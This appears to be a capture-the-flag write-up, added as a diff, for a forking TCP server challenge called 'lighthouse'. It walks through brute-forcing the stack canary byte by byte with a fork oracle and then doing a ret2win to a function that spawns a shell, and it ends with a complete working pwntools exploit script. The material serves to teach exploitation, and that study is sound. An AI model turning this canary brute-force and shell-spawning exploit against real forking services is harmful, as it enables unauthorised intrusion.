@@ -1,0 +1,149 @@
+## Lighthouse - ret2win with Canary Brute-Forced
+
+The `lighthouse` binary is a forking TCP server where each connection spawns a child process via `fork()`, and the child calls `vuln()`, which uses `read(STDIN_FILENO, buf, 0x200)` to overflow a 128-byte stack buffer. Because the server forks rather than re-executes, every child inherits the exact same stack canary as the parent for the lifetime of the server process, making byte-by-byte oracle brute-force feasible: a child that survives the overflow without triggering the canary check prints `"Log entry recorded. Over and out."`, while one that corrupts the canary crashes silently, giving a reliable one-bit oracle per connection.
+
+### Phase 0 - Challenge Triage
+
+The binary sub-category is a stack buffer overflow with canary bypass and ret2win, where the canary is recovered byte-by-byte via a fork-based oracle. The artifacts provided are the `lighthouse` ELF binary, its C source `main.c`, and the working exploit `solve.py`. The initial hypothesis is: this challenge looks like a ret2win with canary brute-force because `main()` forks on every accepted connection and the child calls `read(STDIN_FILENO, buf, 0x200)` into a 128-byte `buf` in `vuln()`, the fork model preserves the canary across connections, and the child's response of `"recorded"` vs. a silent crash provides the oracle needed to recover all 8 canary bytes one at a time.
+
+### Phase 1 - Reconnaissance & Enumeration
+
+```bash
+checksec --file=./lighthouse
+```
+
+The exploit loads the binary with `checksec=False`, but the protections are fully determinable from the source and the exploit's structure.
+
+|Protection|Status|Implication|
+|---|---|---|
+|Stack Canary|✅ Enabled|The canary sits at offset 136 from the start of `buf` in `vuln()`; it must be recovered byte-by-byte via the fork oracle before the overflow can reach saved RIP|
+|NX|✅ Enabled|Shellcode injection into `buf` is not possible, so execution must be redirected to `win()`, which already exists in `lighthouse`|
+|PIE|❌ Not present|`win()` resolves to a static address via `exe.sym.win` and `GADGET` is the fixed address `0x000000000040101a`, confirming the binary loads at a predictable base every run|
+|RELRO|❓ Unknown|No GOT writes are performed, so RELRO status has no bearing on this exploit|
+
+Reading `main.c`, the server binds on port 9001 (or the value of the `PORT` environment variable), listens for connections, and on each accepted connection calls `fork()`. The parent closes the client socket and loops; the child calls `handle_client(fd)`, which `dup2()`s the socket onto file descriptors 0, 1, and 2, presents a two-item menu, and on selection `'1'` calls `vuln()`. The function `vuln()` is marked `__attribute__((noinline))` and reads up to `0x200` bytes into `char buf[128]`, a 384-byte overread. The function `win()` is marked `__attribute__((used))` to prevent the compiler from discarding it and calls `system("/bin/sh")`.
+
+### Phase 2 - Vulnerability Identification
+
+The primary vulnerability is a stack buffer overflow in `vuln()`, produced by `read(STDIN_FILENO, buf, 0x200)` into `char buf[128]`: the read limit of 512 bytes (0x200) far exceeds the 128-byte buffer, so any input beyond 128 bytes overflows the stack frame. A stack canary is present at offset 136 from the base of `buf` (128 bytes of buffer plus 8 bytes of compiler-inserted alignment padding), and saved RIP sits at offset 152 (136 bytes to canary plus 8 bytes of canary itself plus 8 bytes of saved RBP). The exploit chains two vulnerabilities: the fork-based oracle is the leak primitive, and the overflow is the overwrite primitive. Because `fork()` duplicates the parent's address space without re-randomising the canary, every child process shares the same 8-byte canary value for the entire lifetime of the server, and the presence of `"recorded"` in the child's output confirms that the canary was correctly preserved, enabling byte-by-byte recovery across 7 × 256 connections at most (the first byte is always `0x00`).
+
+### Phase 3 - Exploitation Plan
+
+```
+TARGET VULNERABILITY: Stack buffer overflow in vuln() via read(STDIN_FILENO, buf, 0x200)
+GOAL: Recover the 8-byte stack canary via fork oracle, then redirect saved RIP to win()
+APPROACH:
+  Step 1: Send OFFSET_TO_CANARY (136) bytes of padding followed by one known byte
+          starting with 0x00; if the child responds with "recorded", the byte is correct
+  Step 2: Repeat for each of the remaining 7 canary bytes, appending confirmed bytes
+          and probing all 256 values until the response oracle confirms each one
+  Step 3: With the full 8-byte canary known, open a final interactive connection,
+          send b'A' * 136 + p64(canary) + b'B' * 8 + p64(GADGET) + p64(exe.sym.win)
+  Step 4: vuln() returns through the ret gadget into win(), system("/bin/sh") fires
+TOOLS: pwntools
+RISK OF FAILURE: Network timeout causing a false negative during brute-force; the
+  ret gadget at 0x000000000040101a must be present to satisfy the 16-byte stack
+  alignment required by system(), and OFFSET_TO_CANARY must be exactly 136 or the
+  canary is never cleanly overwritten
+```
+
+### Phase 4 - Exploit Development
+
+#### Confirming the Stack Frame Layout
+
+In `vuln()`, the declared buffer is `char buf[128]`. The canary is placed by the compiler at the highest address of the local variable region, immediately below the saved RBP, and on this binary it sits at offset 136 from the base of `buf` (128 bytes of buffer plus 8 bytes of padding), as confirmed by `OFFSET_TO_CANARY = 136` in the exploit. Saved RBP occupies bytes 144–151 (8 bytes), and saved RIP occupies bytes 152–159, consistent with `OFFSET_TO_RIP = 152`.
+
+#### Brute-Forcing the Canary Byte by Byte
+
+The `try_byte()` function opens a fresh connection, navigates to `vuln()` by sending `'1'` at the menu prompt, then sends `OFFSET_TO_CANARY` bytes of `b'A'` followed by the already-known canary prefix and one candidate byte. If the child survives (the canary is intact), it prints `"Log entry recorded. Over and out."` and `b'recorded'` appears in the response; a crash produces no such output. The first byte is unconditionally `0x00` because the canary's least-significant byte is always a null terminator. The loop runs 7 iterations to recover the remaining 7 bytes, probing up to 256 values each, for a worst case of 1792 connections.
+
+#### Building the Final Payload
+
+Once `known` holds all 8 canary bytes, `u64(known)` reconstructs the 64-bit canary value. The final payload is assembled as: 136 bytes of `b'A'` to reach the canary, `p64(canary)` to restore it intact, 8 bytes of `b'B'` to overwrite saved RBP, `p64(GADGET)` at `0x000000000040101a` for 16-byte stack alignment, and `p64(exe.sym.win)` as the return target. The connection for this final stage is opened with `interactive=True` to enable `log.info` output.
+
+|What|Value|
+|---|---|
+|`buf` size in `vuln()`|128 bytes|
+|Offset to canary|136 bytes|
+|Offset to saved RBP|144 bytes|
+|Offset to saved RIP|152 bytes|
+|Stack alignment gadget|`0x000000000040101a` (`ret`)|
+|`win()` address|`exe.sym.win` (static, PIE off)|
+
+### The Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF("./lighthouse", checksec=False)
+context.binary = exe
+context.arch   = 'amd64'
+context.os     = 'linux'
+
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
+
+# ── offsets ───────────────────────────────────────────────────────────────────
+OFFSET_TO_CANARY = 136   # buf[128] + 8 bytes padding
+OFFSET_TO_RIP    = 152   # OFFSET_TO_CANARY + canary (8) + saved RBP (8)
+
+# ── gadgets ───────────────────────────────────────────────────────────────────
+GADGET = 0x000000000040101a   # ret — 16-byte stack alignment for system()
+
+def conn(interactive=False):
+    level = 'info' if interactive else 'error'
+    if args.LOCAL:
+        return remote('127.0.0.1', 9001, level=level)
+    return remote(HOSTNAME, PORT, level=level)
+
+def try_byte(known, bval):
+    r = conn()
+    try:
+        r.recvuntil(b'> ', timeout=2)
+        r.sendline(b'1')
+        r.recvuntil(b'entry: ', timeout=2)
+        r.send(b'A' * OFFSET_TO_CANARY + known + bytes([bval]))
+        data = r.recvall(timeout=1)
+        r.close()
+        return b'recorded' in data
+    except Exception:
+        r.close()
+        return False
+
+def main():
+    # ── leak phase ────────────────────────────────────────────────────────────
+    known = b'\x00'
+    for i in range(7):
+        p = log.progress(f'Bruteforcing byte {i+1}')
+        for bval in range(256):
+            p.status(f'Trying {bval:#04x}')
+            if try_byte(known, bval):
+                known += bytes([bval])
+                p.success(f'Found: {bval:#04x}, canary so far: {known.hex()}')
+                break
+        else:
+            p.failure('Failed to find byte')
+
+    canary = u64(known)
+    log.success(f'canary = {canary:#x}')
+
+    # ── exploit phase ─────────────────────────────────────────────────────────
+    r = conn(interactive=True)
+    r.recvuntil(b'> ')
+    r.sendline(b'1')
+    r.recvuntil(b'entry: ')
+
+    payload = flat(
+        b'A' * OFFSET_TO_CANARY,
+        p64(canary),
+        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
+        p64(GADGET),
+        p64(exe.sym.win),
+    )
+    r.send(payload)
+    r.interactive()
+
+if __name__ == '__main__':
+    main()
+```
